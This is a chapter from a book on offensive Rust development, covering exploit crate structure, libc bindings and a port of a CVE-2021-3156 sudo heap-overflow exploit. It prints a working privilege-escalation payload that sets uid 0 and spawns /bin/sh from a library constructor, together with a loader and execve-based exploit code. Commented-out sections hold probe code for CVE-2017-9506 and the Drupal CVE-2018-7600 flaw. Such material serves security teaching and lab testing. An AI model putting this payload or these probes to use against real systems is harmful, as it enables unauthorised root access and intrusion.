+++
title = "Black Hat Rust - Chapter 7"
date = 2021-01-01T6:00:00Z
type = "page"
url = "/black-hat-rust/7"
access = "paid_members"

+++

# Exploit development
<!-- This chapter may be removed in the future, and the content moved to chapter 06 -->


<!--

```
(from mindnode)

Idees
    D’habitude on utilise soit python pour les exploit remote
    soit C pour les exploits locaux

    Rust avec ses high level abstractions et ses possibilite d’aller bas niveau permet de rempalcer les 2 facilement!
libc
faire une crate a la fois binaire et lib
Exploits in the wild
    https://citizenlab.ca/2020/12/the-great-ipwn-journalists-hacked-with-suspected-nso-group-imessage-zero-click-exploit/
FFI
```
-->

Now we know how to find vulnerabilities, it's time to actively exploit our findings.

An **exploit** is a piece of code used to trigger a vulnerability.


Usually, exploits are developed either in python for remote exploits or in C for local exploits.

Mastering both languages is hard and having 2 completely different languages prevents code reuse.

What if we had a single language that is low-level enough while providing high-level abstractions, is exceptionally fast, easy to cross-compile, all of that while being memory safe, highly reusable, and extremely reliable?

You got it! Rust is the perfect language for exploits development.

By writing an exploit in Rust, we can then use it as a binary, embed it in a larger exploitation toolkit, or embed it into a RAT. All of this is very hard to achieve when writing exploits in Python or C. With Rust, it's just a matter of creating a crate.


## Where to find exploits

In chapter 5 we saw where to find known vulnerabilities: on [www.cvedetails.com](https://www.cvedetails.com), and in chapter 6 how to find our own vulnerabilities.


Then you have 2 possibilities:

- You can find a public exploit for this vulnerability and rewrite it in Rust.
- You can write your own exploit from scratch.


I hear you asking: "Where can I find public exploits"?

The two principal sources of public exploits are:

- [exploit-db.com](https://www.exploit-db.com)
- [GitHub](https://github.com/)

Just enter the CVE-ID in the search bar, and voila :)


## Creating a crate that is both a library and a binary


Exploits have this particularity of being used both as programs or embedded in other programs like a worm (more on that in chapter 13).

Creating an executable eases exploration and testing. Libraries enable reuse across projects.

One more time, Rust got our back covered by enabling us to create a crate that can be used both as a library and as a binary.

**[ch_07/bin_lib/Cargo.toml](https://github.com/skerkour/black-hat-rust/blob/main/ch_07/bin_lib/Cargo.toml)**
```toml
[package]
name = "bin_lib"
version = "0.1.0"
edition = "2021"

[lib]
name = "binlib"
path = "src/lib.rs"

[[bin]]
name = "binlib"
path = "src/bin.rs"

[dependencies]
```


**[ch_07/bin_lib/src/lib.rs](https://github.com/skerkour/black-hat-rust/blob/main/ch_07/bin_lib/src/lib.rs)**
```rust
pub fn exploit(target: &str) -> Result<(), String> {
    println!("exploiting {}", target);
    Ok(())
}
```


**[ch_07/bin_lib/src/bin.rs](https://github.com/skerkour/black-hat-rust/blob/main/ch_07/bin_lib/src/bin.rs)**
```rust
use binlib::exploit;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = std::env::args().collect();

    if args.len() != 2 {
        println!("Usage: exploit <target>");
        return Ok(());
    }

    exploit(&args[1])?;

    Ok(())
}
```

Then, we can use `cargo run` like with any other binary crate:
```bash
$ cargo run -- kerkour.com
exploiting kerkour.com
```



## libc

Sometimes, we may need to interface with `C` libraries.

For that, we use the [`libc`](https://docs.rs/libc/latest/libc/) crate which provides types declarations and Rust bindings to platforms' system libraries.


Here is an example calling libc's [`exit`](https://docs.rs/libc/0.2.107/libc/fn.exit.html) function instead of Rust's [`std::process::exit`](https://doc.rust-lang.org/std/process/fn.exit.html).


**[ch_07/libc_exit/src/main.rs](https://github.com/skerkour/black-hat-rust/blob/main/ch_07/libc_exit/src/main.rs)**
```rust
fn main() {
    let exit_status: libc::c_int = libc::EXIT_SUCCESS;
    unsafe {
        libc::exit(exit_status);
    };
}
```

Directly calling `C` functions is always unsafe and thus should be wrapped in an `unsafe` block.

A good practice to use `C` libraries is to write Rust wrappers around the `C` types and functions providing an `unsafe`-free API, thus isolating the unsafe `C` code.

By convention, the crates wrapping `C` libraries are named with a `-sys` prefix. [`openssl-sys`](https://crates.io/crates/openssl-sys), [`libz-sys`](https://crates.io/crates/libz-sys) and [`curl-sys`](https://crates.io/crates/curl-sys), for example.



## Building an exploitation toolkit


[pwntools](https://github.com/Gallopsled/pwntools) is a well-known Python exploit development framework. It provides a lot of functions and helpers to fasten your finding and exploitation of vulnerabilities.

The Rust world, on the other hand, favors smaller crates and the composition of those small packages over monolithic frameworks like `pwntools`.

Here is a list of crates that you can use **today** to help you during your exploit writing sessions.


- [reqwest](https://crates.io/crates/reqwest) for HTTP requests.
- [hyper](https://crates.io/crates/hyper) if you need a low-level HTTP server or client.
- [tokio](https://crates.io/crates/tokio) for when you need to interact with TCP or UDP services.
- [goblin](https://crates.io/crates/goblin) if you need to read or modify executable files (PE, elf, mach-o).
- [rustls](https://crates.io/crates/rustls) if you need to play with TLS services.
- [flate2](https://crates.io/crates/flate2) if you need compression/decompression.



<!-- ## CVE-2017-9506


```rust
#[async_trait]
impl HttpModule for Cve2017_9506 {
    async fn scan(
        &self,
        http_client: &Client,
        endpoint: &str,
    ) -> Result<Option<HttpFinding>, Error> {
        let url = format!(
            "{}/plugins/servlet/oauth/users/icon-uri?consumerUri=https://google.com/robots.txt",
            &endpoint
        );
        let res = http_client.get(&url).send().await?;

        if !res.status().is_success() {
            return Ok(None);
        }

        let body = res.text().await?;
        if body.contains("user-agent: *") && body.contains("disallow") {
            return Ok(Some(HttpFinding::Cve2017_9506(url)));
        }

        Ok(None)
    }
}
```

> Coming soon: Explaination


## CVE-2018-7600

```rust
#[async_trait]
impl HttpModule for Cve2018_7600 {
    async fn scan(
        &self,
        http_client: &Client,
        endpoint: &str,
    ) -> Result<Option<HttpFinding>, Error> {
        let token = "08d15a4aef553492d8971cdd5198f31408d15a4aef553492d8971cdd5198f314";

        let form = [
            ("form_id", "user_pass"),
            ("_triggering_element_name", "name"),
        ];
        let query_params = [
            ("name[#type]", "markup"),
            ("name[#markup]", &(token.clone())),
            ("name[#post_render][]", "printf"),
            ("q", "user/password"),
        ];

        let url = format!("{}/", endpoint);
        let res = http_client
            .post(&url)
            .query(&query_params)
            .form(&form)
            .send()
            .await?;

        let body = res.text().await?;

        if let Some(matchs) = self.form_regex.captures(&body) {
            if matchs.len() > 1 {
                let form_id = &matchs[1];

                let form = [("form_build_id", form_id)];
                let query_params = [("q", format!("file/ajax/name/#value/{}", form_id))];
                let res = http_client
                    .post(&url)
                    .query(&query_params)
                    .form(&form)
                    .send()
                    .await?;

                let body = res.text().await?;

                if body.contains(&token) {
                    return Ok(Some(HttpFinding::Cve2018_7600(url)));
                }
            }
        }

        Ok(None)
    }
}
```

> Coming soon: Explaination -->


## CVE-2019-11229 && CVE-2019-89242

I've ported (almost) line-by-line exploits for `CVE-2019-11229` and `CVE-2019-89242` from Python to Rust.

You can find the code in the [GitHub repository accompanying the course](https://github.com/skerkour/black-hat-rust/tree/main/ch_07/exploits).

As I believe that commenting this code has no educational value I chose not to include a detailed explaination here.

That being said, I still encourage you to read the code at least once so you can better understand which crates to use for exploit development in Rust.


## CVE-2021-3156

On the other hand, porting an exploit for [CVE-2021-3156](https://nvd.nist.gov/vuln/detail/CVE-2021-3156), a Heap-Based Buffer Overflow in `sudo` was interesting as it forced me to play with Rust's boundaries.


This exploit was ported from [CptGibbon/CVE-2021-3156](https://github.com/CptGibbon/CVE-2021-3156).


The payload for this exploit is not a raw shellcode. Instead, it's a dynamic `C` library.

To build a dynamic `C` library from Rust code, we need to configure Cargo accordingly.

**[ch_07/exploits/cve_2021_3156/payload/Cargo.toml](https://github.com/skerkour/black-hat-rust/blob/main/ch_07/exploits/cve_2021_3156/payload/Cargo.toml)**

```toml
[package]
name = "payload"
version = "0.1.0"
authors = ["Sylvain Kerkour <sylvain@kerkour.com>"]


[lib]
name = "x"
crate_type = ["dylib"]

[profile.dev]
panic = "abort"

[profile.release]
panic = "abort"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]
```



**[ch_07/exploits/cve_2021_3156/payload/src/lib.rs](https://github.com/skerkour/black-hat-rust/blob/main/ch_07/exploits/cve_2021_3156/payload/src/lib.rs)**
```rust
#![no_std]

use core::arch::asm;

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}

const STDOUT: u64 = 1;
// https://filippo.io/linux-syscall-table/
const SYS_WRITE: u64 = 1;
const SYS_EXIT: u64 = 60;
const SYS_SETUID: u64 = 105;
const SYS_SETGID: u64 = 106;
const SYS_GETUID: u64 = 102;
const SYS_EXECVE: u64 = 59;
```

```rust
unsafe fn syscall0(scnum: u64) -> u64 {
    let ret: u64;
    asm!(
        "syscall",
        in("rax") scnum,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
        options(nostack),
    );
    ret
}
// ...
```

Not sure what does it mean? Don't worry, we will learn more about this exotic stuff in the next chapter when crafting shellcodes.


Then comes the little trick. In order to work, the exploit needs to execute a function when the library is loaded (with `dlopen`, for example).


For that, we are going to put a pointer to the function we want to execute in the `.init_array` section.

When the library is loaded by any program, the `rust_init` function will be called and the actual payload executed.

```rust
#[link_section = ".init_array"]
pub static INIT: unsafe extern "C" fn() = rust_init;

// out actual payload
#[no_mangle]
pub unsafe extern "C" fn rust_init() {
    let message = "[+] Hello from Rust payload\n";
    syscall3(
        SYS_WRITE,
        STDOUT,
        message.as_ptr() as u64,
        message.len() as u64,
    );

    syscall1(SYS_SETUID, 0);
    syscall1(SYS_SETGID, 0);

    if syscall0(SYS_GETUID) == 0 {
        let message = "[+] We are root!\n";
        syscall3(
            SYS_WRITE,
            STDOUT,
            message.as_ptr() as u64,
            message.len() as u64,
        );

        let command = "/bin/sh";
        syscall3(SYS_EXECVE, command.as_ptr() as u64, 0, 0);
    } else {
        let message = "[-] We are not root!\n[-] Exploit failed!\n";
        syscall3(
            SYS_WRITE,
            STDOUT,
            message.as_ptr() as u64,
            message.len() as u64,
        );
    }

    syscall1(SYS_EXIT, 0);
}
```

To test that the `rust_init` function is actually called when the library is loaded, we create a simple loader program that loads the library.

**[ch_07/exploits/cve_2021_3156/loader/src/main.rs](https://github.com/skerkour/black-hat-rust/blob/main/ch_07/exploits/cve_2021_3156/loader/src/main.rs)**
```rust
// A simple program to load a dynamic library, and thus test
// that the rust_init function is called
fn main() {
    let lib_path = "./libnss_x/x.so.2";

    unsafe {
        libc::dlopen(lib_path.as_ptr() as *const i8, libc::RTLD_LAZY);
    }
}
```

You can test it by running:

```bash
$ make payload
$ make load
```

Which should print:
```default
[+] Hello from Rust payload
...
```


Finally, the actual exploit.

Feel free to browse the code in the GitHub repository for the details. Here we are going to focus on the interesting bits of the implementation.

In idiomatic Rust, you would use [`std::process::Command`](https://doc.rust-lang.org/std/process/struct.Command.html) to execute an external program.

```rust
let env = [("var", "value")];
let env: HashMap<String, String> = env.iter().map(|e| (e.to_string(), e.to_string())).collect();

let args = ["-A", "-s", "AAAAA..."];


Command::new("sudoedit")
    .stdin(Stdio::null())
    .stdout(Stdio::inherit())
    .env_clear()
    .envs(&env)
    .args(args.iter())
    .spawn()
    .expect("running printenv");
```

Unfortunately, Rust's API is "too safe" for our use case and doesn't allow us to play with the memory as we want to overflow the buffer.


This is where `libc` comes into play. By using `libc::execve` we can fully control the layout of the memory.

The trick is to turn a Rust array of `&str` into a `C` array of pointers to `C` strings (which a `NULL` terminated array of `*char`, `*char[]`) for `execve`'s `args` and `env` arguments.

**[ch_07/exploits/cve_2021_3156/exploit/src/main.rs](https://github.com/skerkour/black-hat-rust/blob/main/ch_07/exploits/cve_2021_3156/exploit/src/main.rs)**
```rust
use std::ffi::CString;
use std::os::raw::c_char;

fn main() {
    let args = ["sudoedit", "-A", "-s", "AA..."];
    let args: Vec<*mut c_char> = args
        .iter()
        .map(|e| CString::new(*e).expect("building CString").into_raw())
        .collect();
    let args: &[*mut c_char] = args.as_ref();


    let env = ["..."];
    let env: Vec<*mut c_char> = env
        .iter()
        .map(|e| CString::new(*e).expect("building CString").into_raw())
        .collect();
    let env: &[*mut c_char] = env.as_ref();

    unsafe {
        libc::execve(
            "/usr/bin/sudoedit".as_ptr() as *const i8,
            args.as_ptr() as *const *const i8,
            env.as_ptr() as *const *const i8,
        );
    }
}
```

You can test the exploit by running:

**[ch_07/exploits/cve_2021_3156/README.md](https://github.com/skerkour/black-hat-rust/blob/main/ch_07/exploits/cve_2021_3156/README.md)**
```bash
$ make payload
$ make exploit
$ docker run --rm -ti -v `pwd`:/exploit ubuntu:focal-20210416
apt update && apt install sudo=1.8.31-1ubuntu1
adduser \
    --disabled-password \
    --gecos "" \
    --shell "/bin/bash" \
    "bhr"
su bhr
cd /exploit
./rust_exploit
```


## Summary

* Rust is the only language providing low-level control and high-level abstractions enabling both remote and local exploits development.
* Rust allows creating both the shellcode and the exploit in the same language.
* Use the `libc` crate when you need to interface with `C` code.



## [Next Chapter: Writing shellcodes in Rust](/black-hat-rust/8)
